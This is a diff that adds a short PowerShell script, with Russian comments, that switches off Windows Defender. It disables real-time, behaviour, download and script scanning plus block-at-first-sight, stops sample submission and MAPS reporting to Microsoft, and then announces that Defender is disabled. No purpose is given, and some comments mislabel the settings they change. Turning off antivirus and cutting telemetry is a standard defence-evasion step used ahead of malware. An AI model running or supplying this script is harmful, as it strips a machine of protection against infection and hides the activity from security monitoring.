@@ -1,0 +1,22 @@
+# Отключаем реальный защитник
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Отключаем обнаружение вредоносных программ
+Set-MpPreference -DisableBehaviorMonitoring $true
+
+# Отключаем защиту от угроз
+Set-MpPreference -DisableIOAVProtection $true
+
+# Отключаем защиту эксплуатации
+Set-MpPreference -DisableScriptScanning $true
+
+# Отключаем автоматическое определение и удаление вредоносного ПО
+Set-MpPreference -DisableBlockAtFirstSeen $true
+
+# Отключаем отправку образцов файлов Microsoft
+Set-MpPreference -SubmitSamplesConsent 2
+
+# Отключаем отправку отчетов о вредоносных программах
+Set-MpPreference -MAPSReporting 0
+
+Write-Host "Windows Defender отключен."
